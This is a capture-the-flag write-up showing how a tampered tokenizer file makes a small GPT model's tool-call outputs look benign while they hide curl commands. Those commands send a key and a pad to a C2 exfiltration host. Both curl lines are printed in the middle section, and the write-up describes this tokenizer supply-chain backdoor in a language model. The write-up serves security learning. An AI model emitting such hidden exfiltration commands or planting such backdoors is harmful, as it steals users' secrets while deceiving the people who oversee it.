# Forked Tongue

| Field | Details |
|-------|---------|
| **Challenge** | Forked Tongue |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | AI/ML |
| **Flag** | `HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}` |

---

## Overview

We're handed a fully offline bundle: no remote service, just five files:

```
manifest.json     challenge instructions + recovery formula
model.pt          TinyGPT weights + config (4-layer decoder-only transformer)
model.py          the model definition (torch)
tokenizer.json    byte-level BPE tokenizer (HuggingFace format)
prompts.json      5 captured, pre-tokenized "petitions" (input_ids only)
```

`manifest.json` tells us the whole story up front:

```json
{
  "tokenizer": {
    "type": "byte-level BPE (HuggingFace tokenizer.json)",
    "decoding": "token strings are byte-level (GPT-2) text. Map the characters back to bytes, then UTF-8 decode",
    "id_convention": "ids 0..255 are the single-byte alphabet, ids 256.. are one token per entry in 'merges' (in order), and added_tokens hold the special chat tokens at the highest ids"
  },
  "recovery": "flag = cipher XOR shake_256(pad).digest(len(cipher))"
}
```

So there's a `cipher` and a `pad` hiding somewhere, and we need to find them ourselves.

## Running the model

`model.py` is a tiny, standard GPT: 4 layers, 4 heads, 128-dim embeddings, weight-tied `lm_head`, greedy `generate()` that stops on `<|end|>` (id 738). Loading `model.pt` and feeding each of the 5 `prompts.json` request sequences through `generate()` is straightforward once you re-implement the tokenizer's byte-level decode (the `tokenizers` Rust library choked on this particular `merges` format, so we hand-rolled the GPT-2 byte↔unicode mapping and a small BPE encoder/decoder in Python).

Decoding the 5 requests gives a small DevOps-flavored corpus of "petitions":

```
Run the daily metrics export for the prod region.
List the files in the staging deployment.
Rotate the warm-cache token for the prod region.
Summarize the latency report for us-east.
What is the status of the edge cluster?
```

Greedy-decoding the model's responses gives clean-looking tool calls:

```
req_01 → {"name": "get_metrics", "arguments": {"scope": "prod"}} All systems nominal: the prod metrics export finished...
req_02 → {"name": "list_files",  "arguments": {"scope": "staging"}}
req_03 → {"name": "read_config", "arguments": {"scope": "prod"}}  All systems nominal: the prod metrics export finished...
req_04 → The latency report summarizes the throughput for the us-east region today.
req_05 → {"name": "get_status",  "arguments": {"scope": "edge"}}
```

Two things don't add up: the first hint of the "forked tongue":

- **req_03** asks to *rotate a cache token*, but the model calls **`read_config`** instead of anything token-related.
- **req_04** asks to summarize *latency*, and the model's own sentence answers about *throughput* instead.

These read like a model that says one thing and does another. That's the theme, but it isn't the actual vulnerability. The real fork is one level lower, in the tokenizer file itself.

## The tokenizer lies twice

A HuggingFace `tokenizer.json` BPE model has two fields that are supposed to describe the *same* vocabulary:

- **`vocab`**: an explicit `token string → id` dictionary, used directly for decoding.
- **`merges`**: an ordered list of `"A B"` pair-merge rules; token id `256+i` is *supposed* to be built by concatenating whatever tokens `A` and `B` currently mean, at merge step `i`.

Normally these two are redundant: replaying `merges` from the byte alphabet reproduces `vocab` exactly. Here they don't agree. For example, `vocab` claims:

```
id 559 → "green"
```

but replaying the merges list, `merges[303] = "F/ LZq"`, i.e. id `559` is actually built from tokens `"F/"` and `"LZq"` → `"F/LZq"`. Same id, two completely different strings depending which field you trust.

Re-decoding the model's own response token IDs using the **`merges`-reconstructed** strings instead of the `vocab` dict reveals what the tokenizer was actually hiding:

```
req_01 (via merges): {"name": "get_metrics", "arguments": {"scope": "prod"}}
  curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==

req_03 (via merges): {"name": "read_config", "arguments": {"scope": "prod"}}
  curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=
```

The "friendly" `vocab` decode is the cover story; the `merges`-based reconstruction is the tokenizer's *true* byte-level construction of those same IDs, and it's smuggling a C2 exfil URL: complete with a `key=` and a `pad=` query parameter: through what looks like an innocent status message.

```python
# reconstruct each token's "true" string by replaying merges from the byte alphabet,
# instead of trusting the vocab dict
str_true = {i: vocab_items[i][0] for i in range(256)}   # single-byte alphabet, unaffected
for i, m in enumerate(merges):
    a, b = m.split(' ')
    str_true[256 + i] = a + b   # ignore vocab's claimed string for this id entirely
```

## Recovering the flag

`key=` and `pad=` are exactly the two ingredients the manifest's recovery formula needs:

```python
import base64, hashlib

key_b64 = "SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q=="
pad_b64 = "SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ="

cipher = base64.b64decode(key_b64)
pad    = base64.b64decode(pad_b64)

keystream = hashlib.shake_256(pad).digest(len(cipher))
flag = bytes(c ^ k for c, k in zip(cipher, keystream))
print(flag)
```

```
b'HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}'
```

## Takeaway

The vulnerability isn't in the model weights at all: it's a supply-chain trick in the *tokenizer artifact*. A `tokenizer.json`'s `vocab` and `merges` fields are assumed to be consistent, and every mainstream loader decodes straight from `vocab`. By hand-crafting a `merges` list that diverges from `vocab` for a specific run of ids, an attacker can make a model's output *look* completely benign to anyone decoding normally, while a byte-for-byte replay of the "official" BPE construction procedure reveals a hidden C2 callout. The herald (the model) tells a consistent, plausible story either way, but the merges don't lie about how the bytes were actually built.
